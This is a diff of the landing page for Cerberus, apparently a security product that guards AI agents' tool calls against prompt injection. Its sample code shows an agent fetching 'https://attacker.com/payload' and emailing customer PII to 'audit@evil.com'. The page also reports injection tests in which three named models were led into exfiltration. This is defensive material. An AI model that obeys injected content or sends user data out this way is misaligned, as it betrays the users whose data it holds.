-          <td>OpenAI</td>
-          <td class="pct-med">23.3%</td>
-          <td class="pct-low">0.0%</td>
-          <td class="pct-green" style="color:var(--green)">100%</td>
-          <td class="pct-green" style="color:var(--green)">100%</td>
-        </tr>
-        <tr>
-          <td>Anthropic</td>
-          <td class="pct-low">2.2%</td>
-          <td class="pct-low">0.0%</td>
-          <td style="color:var(--green)">100%</td>
-          <td style="color:var(--green)">100%</td>
-        </tr>
-        <tr>
-          <td>Google</td>
-          <td class="pct-med">70.0%</td>
-          <td class="pct-low">0.0%</td>
-          <td style="color:var(--green)">100%</td>
-          <td style="color:var(--green)">100%</td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
-
-  <p style="color:var(--text-dim);font-size:0.8rem;margin-top:1rem;">
-    L1 and L2 are deterministic — 100% accuracy across all 285 runs, zero FPs, zero FNs.
-    L3 detection tracks successful injection compliance. Control group: 0/15 false exfiltrations.
-  </p>
 </section>
 
-<!-- ── Quickstart ─────────────────────────────────────────────────────────── -->
-<section id="quickstart">
-  <h2>From zero to <em>blocked attack</em> in 5 minutes</h2>
-  <p class="section-sub">Install the package and wrap your tool executors.</p>
+<div class="section-divider"></div>
 
-  <div class="code-block" style="margin-bottom:1.5rem;">
-    <div class="code-header">
-      <span>bash</span>
+<!-- ── Features ───────────────────────────────────────────────────────────── -->
+<section class="section">
+  <div class="section-inner">
+    <div class="section-label">Capabilities</div>
+    <h2>Everything your team needs.<br><em>Nothing you don't.</em></h2>
+    <p class="section-sub">A complete runtime security platform — detection engine, observability stack, gateway mode, and framework adapters — shipped as a single package.</p>
+
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon red">
+          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        </div>
+        <div class="feature-title">4-Layer Detection Engine</div>
+        <div class="feature-desc">L1 data source classification, L2 token provenance, L3 outbound intent, L4 memory contamination — all feeding one correlation engine. 7 sub-classifiers. 773 tests.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon emerald">
+          <svg viewBox="0 0 24 24"><path d="M13 2.05v2.02c3.95.49 7 3.85 7 7.93 0 3.21-1.81 6-4.72 7.72L13 17v5h5l-1.22-1.22C19.91 19.07 22 15.76 22 12c0-5.18-3.95-9.45-9-9.95zM11 2.05C5.95 2.55 2 6.82 2 12c0 3.76 2.09 7.07 5.22 8.78L6 22h5v-5l-2.28 2.28C7.81 18 6 15.21 6 12c0-4.08 3.05-7.44 7-7.93V2.05z"/></svg>
+        </div>
+        <div class="feature-title">52&#956;s Median Latency</div>
+        <div class="feature-desc">Detection overhead is 0.01% of typical LLM response time. p99 is 0.23ms. Cerberus never becomes your bottleneck — even at scale.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon blue">
+          <svg viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14z"/></svg>
+        </div>
+        <div class="feature-title">Framework Agnostic</div>
+        <div class="feature-desc">Native adapters for LangChain, Vercel AI SDK, and OpenAI Agents SDK. Generic guard() API for any agentic framework. Zero framework code changes required.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon amber">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
+        </div>
+        <div class="feature-title">HTTP Gateway Mode</div>
+        <div class="feature-desc">Deploy Cerberus as a transparent HTTP proxy with createProxy(). Zero code changes to your agent. Routes tool calls through detection at the network layer.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon purple">
+          <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14l-5-5 1.41-1.41L12 14.17l7.59-7.59L21 8l-9 9z"/></svg>
+        </div>
+        <div class="feature-title">OpenTelemetry Built-In</div>
+        <div class="feature-desc">One span + 3 metrics per tool call. Plug into Grafana, Datadog, Honeycomb, or any OTel backend. Pre-built Grafana dashboard with 16 security panels included.</div>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon cyan">
+          <svg viewBox="0 0 24 24"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+        </div>
+        <div class="feature-title">Open Source Core (MIT)</div>
+        <div class="feature-desc">@cerberus-ai/core is MIT licensed and on npm. Audit the detection logic, contribute sub-classifiers, or self-host without a license. Enterprise adds production infrastructure.</div>
+      </div>
     </div>
-    <pre>npm install @cerberus-ai/core</pre>
   </div>
+</section>
 
-  <div class="code-block" style="margin-bottom:1.5rem;">
-    <div class="code-header">
-      <span>TypeScript</span>
-      <span style="color:var(--green);font-size:0.7rem;">guard() wraps your tools — no framework changes</span>
-    </div>
-    <pre><span class="kw">import</span> { guard } <span class="kw">from</span> <span class="str">'@cerberus-ai/core'</span>;
+<div class="section-divider"></div>
 
-<span class="cmt">// Your existing tool executors</span>
+<!-- ── Integration ────────────────────────────────────────────────────────── -->
+<section class="section section-alt" id="integration">
+  <div class="section-inner">
+    <div class="code-section-inner">
+      <div>
+        <div class="section-label emerald">Integration</div>
+        <h2>One function call.<br><em class="emerald">Full coverage.</em></h2>
+        <p class="section-sub">
+          Wrap your existing tool executors with guard(). No model changes, no framework modifications, no agent rewrites. Drop it in — it works.
+        </p>
+
+        <div class="code-note">
+          # npm install @cerberus-ai/core<br>
+          # docker run ghcr.io/odingard/cerberus-gateway<br>
+          # or: use a framework adapter directly
+        </div>
+
+        <div class="integrations">
+          <span class="int-tag live">guard() API</span>
+          <span class="int-tag live">createProxy()</span>
+          <span class="int-tag live">LangChain</span>
+          <span class="int-tag live">Vercel AI SDK</span>
+          <span class="int-tag live">OpenAI Agents</span>
+          <span class="int-tag live">OpenAI Functions</span>
+          <span class="int-tag live">Anthropic Tools</span>
+          <span class="int-tag live">Google Gemini</span>
+          <span class="int-tag live">MCP Scanner</span>
+          <span class="int-tag planned">AutoGen — planned</span>
+          <span class="int-tag planned">Ollama — planned</span>
+        </div>
+      </div>
+
+      <div>
+        <div class="code-block">
+          <div class="code-header">
+            <div class="code-dots">
+              <div class="code-dot code-dot-r"></div>
+              <div class="code-dot code-dot-y"></div>
+              <div class="code-dot code-dot-g"></div>
+            </div>
+            <span class="code-filename">agent.ts — guard() wraps your tools transparently</span>
+            <span></span>
+          </div>
+          <pre><span class="kw">import</span> { <span class="fn">guard</span> } <span class="kw">from</span> <span class="str">'@cerberus-ai/core'</span>;
+
+<span class="cmt">// Your existing tool executors — unchanged</span>
 <span class="kw">const</span> tools = {
   readDatabase: <span class="kw">async</span> (args) =&gt; db.<span class="fn">query</span>(args.sql),
-  fetchUrl:     <span class="kw">async</span> (args) =&gt; fetch(args.url).<span class="fn">then</span>(r =&gt; r.<span class="fn">text</span>()),
+  fetchWebpage: <span class="kw">async</span> (args) =&gt; fetch(args.url).<span class="fn">then</span>(r =&gt; r.<span class="fn">text</span>()),
   sendEmail:    <span class="kw">async</span> (args) =&gt; mailer.<span class="fn">send</span>(args),
 };
 
-<span class="cmt">// One function call — Cerberus intercepts transparently</span>
-<span class="kw">const</span> { executors: secured } = <span class="fn">guard</span>(
-  tools,
-  {
-    alertMode: <span class="str">'interrupt'</span>,
-    threshold: <span class="num">3</span>,
-    trustOverrides: [
-      { toolName: <span class="str">'readDatabase'</span>, trustLevel: <span class="str">'trusted'</span>   },
-      { toolName: <span class="str">'fetchUrl'</span>,     trustLevel: <span class="str">'untrusted'</span> },
-    ],
-  },
-  [<span class="str">'sendEmail'</span>], <span class="cmt">// outbound tools — L3 monitors these</span>
-);
+<span class="cmt">// One call — Cerberus intercepts transparently</span>
+<span class="kw">const</span> { executors: secured } = <span class="fn">guard</span>(tools, {
+  alertMode: <span class="str">'interrupt'</span>,
+  threshold: <span class="num">3</span>,
+  trustOverrides: [
+    { toolName: <span class="str">'readDatabase'</span>, trustLevel: <span class="str">'trusted'</span>   },
+    { toolName: <span class="str">'fetchWebpage'</span>, trustLevel: <span class="str">'untrusted'</span> },
+  ],
+}, [<span class="str">'sendEmail'</span>]); <span class="cmt">// outbound tools — L3 monitors these</span>
 
-<span class="cmt">// Use exactly like before — Cerberus runs in the middle</span>
+<span class="cmt">// Use exactly like before</span>
 <span class="kw">await</span> secured.<span class="fn">readDatabase</span>({ sql: <span class="str">'SELECT * FROM customers'</span> });
-<span class="kw">await</span> secured.<span class="fn">fetchUrl</span>({ url: <span class="str">'https://attacker.com/payload'</span> });
+<span class="cmt">// [Cerberus] turn-000: score=1/4  L1: PII detected &#10003;</span>
+
+<span class="kw">await</span> secured.<span class="fn">fetchWebpage</span>({ url: <span class="str">'https://attacker.com/payload'</span> });
+<span class="cmt">// [Cerberus] turn-001: score=2/4  L2: injection found &#10003;</span>
+
 <span class="kw">await</span> secured.<span class="fn">sendEmail</span>({ to: <span class="str">'audit@evil.com'</span>, body: piiData });
-<span class="cmt">// ↑ [Cerberus] Tool call blocked — risk score 3/4</span></pre>
-  </div>
-
-  <p style="color:var(--text-dim);font-size:0.875rem;">
-    See the <a href="https://github.com/Odingard/cerberus/blob/main/docs/getting-started.md">getting-started guide</a>
-    for the full walkthrough, or try the Docker demo with no API keys:
-  </p>
-
-  <div class="code-block" style="margin-top:1rem;">
-    <div class="code-header"><span>bash — no API keys required</span></div>
-    <pre>docker run --rm ghcr.io/odingard/cerberus-demo</pre>
+<span class="cmt">// [Cerberus] turn-002: score=3/4 &#10007; BLOCKED — exfiltration intercepted</span></pre>
+        </div>
+      </div>
+    </div>
   </div>
 </section>
 
-<!-- ── Integrations ───────────────────────────────────────────────────────── -->
-<section>
-  <h2>Works with your <em>stack</em></h2>
-  <p class="section-sub">Native adapters for every major agentic AI framework.</p>
-  <div class="integrations">
-    <span class="integration-tag supported">guard() — generic</span>
-    <span class="integration-tag supported">createProxy() — HTTP</span>
-    <span class="integration-tag supported">LangChain</span>
-    <span class="integration-tag supported">Vercel AI SDK</span>
-    <span class="integration-tag supported">OpenAI Agents SDK</span>
-    <span class="integration-tag supported">OpenAI Function Calling</span>
-    <span class="integration-tag supported">Anthropic Tool Use</span>
-    <span class="integration-tag supported">Google Gemini</span>
-    <span class="integration-tag supported">MCP Tool Scanning</span>
-    <span class="integration-tag">AutoGen — planned</span>
-    <span class="integration-tag">Ollama — planned</span>
-  </div>
-</section>
+<div class="section-divider"></div>
 
-<!-- ── Enterprise ────────────────────────────────────────────────────────── -->
-<section id="enterprise">
-  <div class="badge" style="background:rgba(66,153,225,0.12);color:#4299e1;border-color:rgba(66,153,225,0.3)">Open Source · Enterprise</div>
-  <h2>Choose the right <em>deployment</em></h2>
-  <p class="section-sub">The detection engine is open source and free. The enterprise package adds the production infrastructure teams need to deploy, monitor, and operate it at scale.</p>
+<!-- ── Research ───────────────────────────────────────────────────────────── -->
+<section class="section" id="research">
+  <div class="section-inner">
+    <div class="section-label">Validation</div>
+    <h2>Scientifically validated<br>at <em>real-world scale</em></h2>
+    <p class="section-sub">
+      N=285 real API calls. 30 payloads &#215; 3 trials &#215; 3 providers. Wilson 95% confidence intervals. 6-factor causation scoring. 5 negative controls per provider — zero false exfiltrations.
+    </p>
 
-  <!-- Comparison table -->
-  <div style="overflow-x:auto;margin:2.5rem auto;max-width:860px">
-    <table style="width:100%;border-collapse:collapse;font-size:.9rem">
-      <thead>
-        <tr>
-          <th style="text-align:left;padding:.75rem 1rem;border-bottom:2px solid var(--border);color:var(--text-muted);font-weight:600;width:44%">Feature</th>
-          <th style="text-align:center;padding:.75rem 1rem;border-bottom:2px solid var(--border);font-weight:700;width:28%">
-            Open Source<br><span style="font-size:.75rem;color:var(--text-muted);font-weight:400">@cerberus-ai/core · MIT</span>
-          </th>
-          <th style="text-align:center;padding:.75rem 1rem;border-bottom:2px solid #4299e1;font-weight:700;width:28%;background:rgba(66,153,225,0.06);border-radius:8px 8px 0 0">
-            Enterprise<br><span style="font-size:.75rem;color:#4299e1;font-weight:400">Self-hosted · Annual license</span>
-          </th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem;color:var(--text-muted);font-size:.85rem" colspan="3"><strong style="color:var(--text)">Detection Engine</strong></td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">4-layer detection (L1–L4)</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04)">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">7 sub-classifiers incl. MCP scanner</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04)">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">LangChain, Vercel AI, OpenAI Agents adapters</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04)">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">OpenTelemetry metrics export</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04)">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem;color:var(--text-muted);font-size:.85rem" colspan="3"><strong style="color:var(--text)">Production Infrastructure</strong></td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Cerberus Gateway — zero-code-change HTTP proxy</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Grafana dashboard — 16 security panels</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Prometheus + Alertmanager (Slack, PagerDuty, email)</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Tamper-evident chained audit log</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">License validation + rate limiting</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Docker Compose — one command, 5-container stack</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem;color:var(--text-muted);font-size:.85rem" colspan="3"><strong style="color:var(--text)">Support & Compliance</strong></td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Community support (GitHub issues)</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04)">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">Email support + setup assistance</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">SLA — 99.9% uptime, P1 4h response (Premium)</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr style="border-bottom:1px solid var(--border)">
-          <td style="padding:.65rem 1rem">MSA, DPA, GDPR/CCPA/HIPAA documentation</td>
-          <td style="text-align:center;padding:.65rem 1rem;color:var(--text-muted)">—</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);color:#4299e1;font-weight:700">✓</td>
-        </tr>
-        <tr>
-          <td style="padding:.65rem 1rem">Your data stays in your VPC</td>
-          <td style="text-align:center;padding:.65rem 1rem">✓</td>
-          <td style="text-align:center;padding:.65rem 1rem;background:rgba(66,153,225,0.04);border-radius:0 0 8px 0">✓</td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Provider</th>
+            <th>Model</th>
+            <th>Any Exfiltration</th>
+            <th>Full Injection Compliance</th>
+            <th>95% CI</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>OpenAI</td>
+            <td class="mono">gpt-4o-mini</td>
+            <td class="pct-high">100% (90/90)</td>
+            <td class="pct-med">17.8% (16/90)</td>
+            <td class="mono" style="color:var(--text-muted)">[11.2%, 26.9%]</td>
+          </tr>
+          <tr>
+            <td>Anthropic</td>
+            <td class="mono">claude-sonnet-4</td>
+            <td class="pct-high">100% (90/90)</td>
+            <td class="pct-low">2.2% (2/90)</td>
+            <td class="mono" style="color:var(--text-muted)">[0.6%, 7.7%]</td>
+          </tr>
+          <tr>
+            <td>Google</td>
+            <td class="mono">gemini-2.5-flash</td>
+            <td class="pct-high">98.9% (89/90)</td>
+            <td class="pct-high">48.9% (44/90)</td>
+            <td class="mono" style="color:var(--text-muted)">[38.8%, 59.0%]</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
 
-  <div style="text-align:center;margin-top:2rem">
-    <a href="pricing.html"
-       class="btn btn-primary" style="font-size:1.1rem;padding:.9rem 2.25rem;background:#4299e1;border-color:#4299e1;box-shadow:0 0 24px rgba(66,153,225,0.35);font-weight:700">
-      See Plans &amp; Pricing →
-    </a>
-    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-secondary" style="margin-left:0.75rem">
-      Try Live Demo First
-    </a>
-    <p style="margin-top:1rem;font-size:0.8rem;color:var(--text-dim)">
-      Annual license · $15K Standard · $30K Premium · Setup support included
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Provider</th>
+            <th>Cerberus Detection Rate</th>
+            <th>False Positive Rate</th>
+            <th>L1 Accuracy</th>
+            <th>L2 Accuracy</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>OpenAI</td>
+            <td class="pct-med">23.3%</td>
+            <td class="pct-low">0.0%</td>
+            <td class="pct-low">100%</td>
+            <td class="pct-low">100%</td>
+          </tr>
+          <tr>
+            <td>Anthropic</td>
+            <td class="pct-low">2.2%</td>
+            <td class="pct-low">0.0%</td>
+            <td class="pct-low">100%</td>
+            <td class="pct-low">100%</td>
+          </tr>
+          <tr>
+            <td>Google</td>
+            <td class="pct-med">70.0%</td>
+            <td class="pct-low">0.0%</td>
+            <td class="pct-low">100%</td>
+            <td class="pct-low">100%</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p style="font-size:0.8rem;color:var(--text-muted);line-height:1.6">
+      L1 and L2 are deterministic — 100% accuracy across all 285 runs, zero false positives, zero false negatives. L3 detection rate tracks successful injection compliance (attacker redirecting to attacker's endpoint). Control group: 0/15 false exfiltrations across all providers.
     </p>
   </div>
 </section>
 
-<!-- ── Live Demo ─────────────────────────────────────────────────────────── -->
-<div class="cta-section" style="background:linear-gradient(135deg,rgba(239,68,68,0.08),rgba(124,58,237,0.08));border-top:1px solid rgba(239,68,68,0.2)">
-  <div class="badge" style="background:rgba(239,68,68,0.15);color:var(--red);border-color:rgba(239,68,68,0.3)">Interactive Demo</div>
-  <h2>Watch Cerberus block a <em>live attack</em></h2>
-  <p>Run real attack scenarios — prompt injection, data exfiltration, the full Lethal Trifecta —<br>and watch Cerberus detect and block them in real time with live Grafana metrics.</p>
-  <div class="hero-actions">
-    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-primary" style="background:var(--red);border-color:var(--red);font-size:1.05rem;padding:0.85rem 2rem">▶ Launch Live Demo</a>
-    <a href="https://grafana.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-secondary">View Grafana Dashboard</a>
-  </div>
-  <p style="margin-top:1.5rem;font-size:0.8rem;color:var(--text-muted)">No sign-up required · Enterprise APT scenario runs 19 tool calls in ~10 seconds</p>
-</div>
+<div class="section-divider"></div>
 
-<!-- ── CTA ───────────────────────────────────────────────────────────────── -->
-<div class="cta-section">
-  <h2>Start protecting your agents <em>today</em></h2>
-  <p>The core SDK is open source and free. Drop it into your agent in minutes.</p>
-  <div class="hero-actions">
-    <a href="https://www.npmjs.com/package/@cerberus-ai/core" class="btn btn-primary">npm install @cerberus-ai/core</a>
-    <a href="https://github.com/Odingard/cerberus" class="btn btn-secondary">Star on GitHub</a>
-  </div>
-  <p style="margin-top:1rem;font-size:0.8rem;color:var(--text-muted)">
-    Need production infrastructure, monitoring, and SLA?
-    <a href="#enterprise" style="color:var(--text);text-decoration:underline">See Enterprise →</a>
-  </p>
-</div>
+<!-- ── Enterprise ─────────────────────────────────────────────────────────── -->
+<section class="section section-alt" id="enterprise">
+  <div class="section-inner">
+    <div class="section-label blue">Open Source + Enterprise</div>
+    <h2>Choose the right<br><em class="blue">deployment</em></h2>
+    <p class="section-sub">The detection engine is open source and free. The enterprise package adds the production infrastructure teams need to deploy, monitor, and operate at scale.</p>
 
-<!-- ── Footer ────────────────────────────────────────────────────────────── -->
-<footer>
-  <div>
-    <div class="footer-logo">Cerberus — <span>Agentic AI Runtime Security</span></div>
-    <div style="font-size:0.75rem;color:var(--muted);margin-top:0.25rem;font-family:var(--mono)">
-      by <a href="https://www.sixsenseenterprise.com" style="color:#C4A96B;text-decoration:none">Odingard Security</a>
-      &nbsp;|&nbsp; Six Sense Enterprise Services LLC
+    <!-- Comparison table (preserved from original) -->
+    <div class="compare-wrap">
+      <table class="compare-table">
+        <thead>
+          <tr>
+            <th class="col-feature">Feature</th>
+            <th>Open Source<br><span style="font-size:.75rem;color:var(--text-muted);font-weight:400">@cerberus-ai/core &middot; MIT</span></th>
+            <th class="col-enterprise">Enterprise<br><span style="font-size:.75rem;color:rgba(59,130,246,0.7);font-weight:400">Self-hosted &middot; Annual license</span></th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr class="section-header">
+            <td colspan="2">Detection Engine</td>
+            <td class="col-enterprise"></td>
+          </tr>
+          <tr>
+            <td>4-layer detection (L1&ndash;L4)</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>7 sub-classifiers incl. MCP scanner</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>LangChain, Vercel AI, OpenAI Agents adapters</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>OpenTelemetry metrics export</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr class="section-header">
+            <td colspan="2">Production Infrastructure</td>
+            <td class="col-enterprise"></td>
+          </tr>
+          <tr>
+            <td>Cerberus Gateway &mdash; zero-code-change HTTP proxy</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Grafana dashboard &mdash; 16 security panels</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Prometheus + Alertmanager (Slack, PagerDuty, email)</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Tamper-evident chained audit log</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>License validation + rate limiting</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Docker Compose &mdash; one command, 5-container stack</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr class="section-header">
+            <td colspan="2">Support &amp; Compliance</td>
+            <td class="col-enterprise"></td>
+          </tr>
+          <tr>
+            <td>Community support (GitHub issues)</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Email support + setup assistance</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>SLA &mdash; 99.9% uptime, P1 4h response (Premium)</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>MSA, DPA, GDPR/CCPA/HIPAA documentation</td>
+            <td class="col-oss"><span class="check-no">&mdash;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+          <tr>
+            <td>Your data stays in your VPC</td>
+            <td class="col-oss"><span class="check-yes">&#10003;</span></td>
+            <td class="col-enterprise"><span class="check-yes">&#10003;</span></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Pricing Cards -->
+    <div class="pricing-cards">
+      <div class="pricing-card">
+        <div class="pricing-badge red">Free Forever</div>
+        <div class="pricing-name">Open Source</div>
+        <div class="pricing-price">$0</div>
+        <div class="pricing-period">MIT License &middot; @cerberus-ai/core</div>
+        <div class="pricing-desc">Full detection engine, all 7 sub-classifiers, framework adapters, and OpenTelemetry integration — open source and free forever.</div>
+        <a href="https://www.npmjs.com/package/@cerberus-ai/core" target="_blank" class="pricing-cta">npm install &#8594;</a>
+      </div>
+      <div class="pricing-card">
+        <div class="pricing-badge">Standard</div>
+        <div class="pricing-name">Enterprise Standard</div>
+        <div class="pricing-price">$15,000 <sub>/yr</sub></div>
+        <div class="pricing-period">Annual license &middot; self-hosted &middot; VPC deployment</div>
+        <div class="pricing-desc">Full production stack — Gateway, Grafana dashboard, Prometheus alerting, Docker Compose deployment, and email support with 48h SLA.</div>
+        <a href="pricing.html" class="pricing-cta">Get Standard &#8594;</a>
+      </div>
+      <div class="pricing-card featured">
+        <div class="pricing-badge">Premium</div>
+        <div class="pricing-name">Enterprise Premium</div>
+        <div class="pricing-price">$30,000 <sub>/yr</sub></div>
+        <div class="pricing-period">Annual license &middot; priority onboarding</div>
+        <div class="pricing-desc">Everything in Standard plus dedicated Slack channel, direct engineering access, custom detection rule review, quarterly briefings, and 24h critical SLA.</div>
+        <a href="pricing.html" class="pricing-cta primary">Get Premium &#8594;</a>
+      </div>
+    </div>
+
+    <div style="text-align:center;margin-top:1.5rem">
+      <p style="font-size:0.85rem;color:var(--text-muted)">
+        Questions before you buy? <a href="mailto:enterprise@sixsenseenterprise.com" style="color:var(--blue)">enterprise@sixsenseenterprise.com</a> &mdash; we reply within one business day.
+      </p>
     </div>
   </div>
-  <div class="footer-links">
-    <a href="index.html">Home</a>
-    <a href="pricing.html">Enterprise</a>
-    <a href="https://github.com/Odingard/cerberus">GitHub</a>
-    <a href="mailto:enterprise@sixsenseenterprise.com">Contact</a>
+</section>
+
+<div class="section-divider"></div>
+
+<!-- ── Final CTA Band ──────────────────────────────────────────────────────── -->
+<div class="cta-band">
+  <div class="section-label" style="display:block;text-align:center;margin-bottom:1rem">Get Started Today</div>
+  <h2 style="text-align:center">Start protecting your AI agents<br><em>today</em></h2>
+  <p>The core SDK is open source and free. Drop it into your agent in minutes. No sign-up required for the live demo.</p>
+  <div class="cta-band-actions">
+    <a href="https://demo.cerberus.sixsenseenterprise.com" target="_blank" class="btn btn-primary btn-pill">
